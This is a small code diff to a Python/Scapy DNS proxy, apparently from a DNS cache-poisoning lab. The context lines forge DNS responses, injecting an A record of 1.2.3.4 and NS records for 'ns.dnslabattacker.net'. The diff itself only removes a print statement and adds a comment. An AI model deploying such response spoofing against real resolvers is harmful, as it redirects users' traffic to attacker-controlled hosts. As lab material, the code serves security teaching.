@@ -17,7 +17,6 @@ port = args.port
 dns_port = args.dns_port
 # Flag to indicate if the proxy should spoof responses
 SPOOF = args.spoof_response
-print("SPOOF setting: ", SPOOF)
 # Address of the BIND server (assuming localhost)
 dns_server = '127.0.0.1'
 
@@ -56,7 +55,7 @@ while True:
             domain_name = modified_response.qd.qname
             modified_response[DNS].ancount = 1
             modified_response[DNS].nscount = 2
-            modified_response[DNS].an = DNSRR(rrname=domain_name, type="A", rdata="1.2.3.4")
+            modified_response[DNS].an = DNSRR(rrname=domain_name, type="A", rdata="1.2.3.4") # only spoof Type A queries
             modified_response[DNS].ns = DNSRR(rrname=domain_name, type="NS", rdata="ns.dnslabattacker.net")/DNSRR(rrname=domain_name, type="NS", rdata="ns.dnslabattacker.net")
             # Send the modified response back to the original requester
             sock.sendto(bytes(modified_response), addr)
